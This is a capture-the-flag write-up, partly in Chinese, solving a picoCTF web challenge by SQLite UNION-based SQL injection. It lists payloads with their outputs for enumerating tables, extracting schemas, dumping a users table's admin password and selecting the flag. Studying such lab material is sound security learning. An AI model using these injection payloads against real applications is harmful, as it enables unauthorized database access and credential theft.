https://play.picoctf.org/events/72/challenges/challenge/358?category=1&page=1

看 response 封包可以發現有 500 internal Error 與 200 OK 的差別

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#string-based---extract-database-structure


' UNION SELECT 1 -- abc				200 OK

' UNION SELECT 'cat', 'cat', 'cat' -- abc	200 OK


===============
' UNION SELECT 'cat', 'cat', sqlite_version(); -- abc
version : 3.31.1

===============
' UNION SELECT 'cat', 'cat',  tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'  -- abc

hints
more_table
offices
users

===============
' UNION SELECT 'cat', 'cat',  sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='hints'  -- abc

CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
==============
' UNION SELECT 'cat', NULL,  info FROM hints  -- abc

Is this the real life?
You are close now?

==============
' UNION SELECT 'cat', 'cat',  sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'  -- abc

CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)
==============
' UNION SELECT 'cat', name,  password FROM users  -- abc
admin	moreRandOMN3ss

==============
' UNION SELECT 'cat', 'cat',  sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='offices'  -- abc

CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)

==============
' UNION SELECT 'cat', 'cat',  sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='more_table'  -- abc

CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
==============
' UNION SELECT 'cat', NULL,  flag FROM more_table  -- abc



